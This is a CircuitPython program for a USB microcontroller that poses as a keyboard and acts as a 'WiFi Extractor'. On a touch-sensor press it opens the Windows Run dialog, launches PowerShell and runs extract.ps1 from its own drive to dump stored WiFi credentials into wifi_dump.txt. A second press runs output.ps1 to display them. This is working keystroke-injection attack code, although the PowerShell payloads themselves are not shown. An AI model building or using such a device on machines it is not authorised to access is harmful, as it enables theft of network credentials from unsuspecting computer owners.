import time
import board
import digitalio
import usb_hid
import neopixel

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
touch = digitalio.DigitalInOut(board.GP15)
touch.direction = digitalio.Direction.INPUT
touch.pull = digitalio.Pull.UP
led = neopixel.NeoPixel(board.GP16, 1, brightness=0.3, auto_write=True)

# States
STATE_FILE = "/state.txt"
IDLE = 0
WAITING = 1

state = IDLE
touch_was_pressed = False

def led_color(r, g, b):
    led[0] = (r, g, b)

def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return f.read().strip()
    except OSError:
        return "IDLE"

def set_state_from_string(s):
    global state
    if s == "WAITING":
        state = WAITING
    else:
        state = IDLE

def run_powershell_script_visible(script_name):
    keyboard.release_all()
    time.sleep(0.3)

    # Open Run dialog
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(1.2)

    # Start PowerShell (VISIBLE, focused)
    layout.write("powershell\n")
    time.sleep(3)  # let PowerShell fully initialize

    # Resolve CIRCUITPY and run script (SAFE)
    layout.write(
        '$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter\n'
        'if (-not $cp) {{ exit }}\n'
        f'$script = Join-Path "${{cp}}:" "{script_name}"\n'
        'if (Test-Path $script) {{\n'
        '    & $script\n'
        '}}\n'
        'exit\n'
    )

    time.sleep(4)

# ---- LOAD PERSISTENT STATE ----
persisted = load_state()
set_state_from_string(persisted)

# Set initial LED color based on state
if state == WAITING:
    led_color(128, 128, 0)  # Yellow
    print("Resuming in WAITING state")
else:
    led_color(128, 0, 0)    # Red
    print("Starting in IDLE state")

def wait_for_state(expected, timeout=15):
    start = time.monotonic()
    while time.monotonic() - start < timeout:
        try:
            with open(STATE_FILE, "r") as f:
                if f.read().strip() == expected:
                    return True
        except OSError:
            pass
        time.sleep(0.5)
    return False

def extract_phase():
    global state
    print("Touch detected. Starting extraction...")
    led_color(0, 0, 128)  # Blue

    run_powershell_script_visible("extract.ps1")
    wait_for_state("WAITING")
    
    state = WAITING

    time.sleep(1)

    led_color(128, 128, 0)  # Yellow
    print("Extraction complete. Touch again for output.")

def read_wifi_dump():
    try:
        with open("/wifi_dump.txt", "r") as f:
            return f.read()
    except OSError:
        return ""

# Notepad method to display output
def output_phase():
    global state
    print("Displaying output...")
    led_color(0, 128, 0)  # Green
    
    wifi_data = read_wifi_dump()

    if not wifi_data.strip():
        print("No WiFi credentials   found.")
        
        run_powershell_script_visible("reset.ps1")

        state = IDLE
        time.sleep(1)

        led_color(128, 0, 0)  # Red
        print("State reset to IDLE. Ready for new extraction cycle.")
        return

    run_powershell_script_visible("output.ps1")
    wait_for_state("IDLE")

    state = IDLE

    time.sleep(1)

    led_color(128, 0, 0)  # Red
    print("Output created. Ready for new extraction cycle.")

# ---- WAIT FOR TOUCH SENSOR TO STABILIZE ----
print("Waiting for touch sensor release...")
while not touch.value:
    time.sleep(0.05)

print("Touch sensor ready.")

# Main loop
print("WiFi Extractor Ready")

while True:
    if not touch.value and not touch_was_pressed:
        touch_was_pressed = True
        
        if state == IDLE:
            print("Touch Sensor to start extraction.")
            extract_phase()
        elif state == WAITING:
            output_phase()
    
    if touch.value and touch_was_pressed:
        touch_was_pressed = False
    
    time.sleep(0.1)